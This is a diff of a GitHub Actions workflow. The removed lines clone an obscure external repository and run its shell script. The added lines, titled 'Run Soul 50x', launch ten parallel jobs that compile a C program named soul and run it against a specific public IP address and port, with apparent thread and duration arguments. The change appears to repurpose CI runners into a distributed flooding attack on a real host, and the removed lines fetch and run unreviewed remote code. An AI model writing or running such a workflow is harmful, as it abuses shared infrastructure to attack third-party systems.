@@ -1,26 +1,14 @@
-name: Setup & Run Script
+name: Run Soul 50x
 
-on:
-  push:
-    branches: [ main ]
-  workflow_dispatch:
+on: [push]
 
 jobs:
-  setup-and-run:
+  soul:
     runs-on: ubuntu-latest
-
+    strategy:
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10]
     steps:
-      - name: Update & Install Packages
-        run: |
-          sudo apt-get update -y && \
-          sudo apt-get install -y screen nano git python3 python3-pip
-
-      - name: Clone External Repo
-        run: |
-          git clone https://github.com/tungtungtun/4ygh7d.git
-
-      - name: Make Script Executable & Run
-        working-directory: 4ygh7d
-        run: |
-          chmod 777 n58don.sh
-          ./n58don.sh
+      - uses: actions/checkout@v3
+      - run: gcc soul.c -o soul -lssl -lcrypto -lpthread
+      - run: ./soul 20.198.79.107 27582 180 900 -1
